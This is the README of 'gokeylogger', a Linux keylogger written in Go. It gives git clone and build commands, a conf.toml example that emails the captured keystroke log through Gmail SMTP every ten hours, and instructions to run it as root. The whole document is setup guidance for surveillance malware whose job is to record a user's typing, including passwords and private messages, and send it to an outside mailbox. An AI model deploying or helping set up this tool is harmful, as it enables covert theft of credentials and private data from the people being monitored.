# gokeylogger for linux os 
```sh
# install :
$ git clone github.com/mehrati/gokeylogger
$ cd gokeylogger/
```
```toml
# edit conf.toml with nano or vim or ..
-----------------------conf.toml example------------------------------
cron_duration = "@every 10h" # send mail keylog file every 10 hour
from_mail = "******@gmail.com" # address send email 
to_mail = "*******@gmail.com" # address recv email
user_mail = "*******@gmail.com" # user mail
subject_mail = "keylogger" # subject mail
host_mail = "smtp.gmail.com" # host mail
pass_mail = "*****" # password mail
port_mail = 587 # port mail
---------------------------------------------------------------------
```
```sh
$ go get -d ./...
$ go build
# run gokeylogger need root privilege : 
$ sudo ./gokeylogger
# kill gokeylogger :
$ ./kill.sh
```